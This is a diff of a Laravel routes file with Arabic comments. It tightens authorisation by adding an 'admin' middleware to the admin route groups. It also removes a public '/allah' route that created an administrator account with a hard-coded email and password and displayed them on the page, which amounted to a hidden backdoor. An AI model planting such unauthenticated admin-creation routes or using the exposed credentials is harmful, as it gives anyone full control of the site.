@@ -323,7 +323,7 @@ Route::middleware(['auth'])->prefix('service-provider')->name('service-provider.
 // ============================================
 // لوحة تحكم المسؤول (Admin)
 // ============================================
-Route::middleware(['auth'])->prefix('admin')->name('admin.')->group(function () {
+Route::middleware(['auth', 'admin'])->prefix('admin')->name('admin.')->group(function () {
     Route::get('/dashboard', [AdminController::class, 'dashboard'])->name('dashboard');
     Route::get('/profile', [AdminController::class, 'profile'])->name('profile');
     Route::put('/profile', [AdminController::class, 'updateProfile'])->name('profile.update');
@@ -354,21 +354,7 @@ Route::view('/contact', 'contact')->name('contact');
 Route::view('/privacy', 'privacy')->name('privacy');
 Route::view('/terms', 'terms')->name('terms');
 
-Route::get('/allah', function() {
-    try {
-        $user = new App\Models\User();
-        $user->name = 'Master Admin';
-        $user->email = 'masteradmin@rizk.com';
-        $user->password = bcrypt('master927ADMIN');
-        $user->user_type = 'admin';
-        $user->is_active = true;
-        $user->save();
-        
-        return '✅ تم إنشاء حساب Admin بنجاح!<br><br>📧 <strong>masteradmin@rizk.com</strong><br>🔑 <strong>master927ADMIN</strong><br><br><a href="/login" style="display: inline-block; padding: 10px 20px; background: #b8860b; color: #fff; text-decoration: none; border-radius: 8px;">تسجيل الدخول</a>';
-    } catch (\Exception $e) {
-        return '❌ خطأ: ' . $e->getMessage();
-    }
-});
+
 
 // ============================================
 // إرسال رسالة من صفحة اتصل بنا
@@ -420,7 +406,7 @@ Route::get('/الاعلانات', function () {
 */
 
 Route::prefix('admin')
-    ->middleware(['auth'])
+    ->middleware(['auth', 'admin'])
     ->group(function () {
 
         Route::get('/news', [
